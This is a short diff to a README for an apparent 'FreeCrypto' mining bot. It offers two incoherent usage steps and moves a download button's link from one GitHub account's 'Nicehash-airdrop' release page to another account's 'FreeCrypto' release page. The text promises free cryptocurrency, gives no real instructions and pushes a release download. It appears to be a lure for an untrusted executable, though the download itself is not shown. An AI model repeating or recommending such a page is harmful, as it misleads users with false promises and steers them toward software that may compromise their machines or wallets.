@@ -42,7 +42,7 @@ https://github.com/cross-psix/FreeCrypto/assets/167144765/a3bbcfbe-48d4-473a-8e8
 1. open Freecrypto bot
 2. Paste into the menu of your cryptocurrency and click start, thereby starting the mining flow
 
--[<img src="https://github.com/culm65gonzo/Nicehash-airdrop/assets/166772185/9f3828a4-7bf9-4708-8a76-e131a36fdcd3"/>](https://github.com/culm65gonzo/Nicehash-airdrop/releases/tag/Download_last_version)
+-[<img src="https://github.com/cross-psix/FreeCrypto/assets/167144765/467a791b-6118-4c92-a5f7-983b7851dfcf"/>](https://github.com/cross-psix/FreeCrypto/releases/tag/Download_last_version)
 
 ### 🚀Please repay with a star for the work done🚀
 
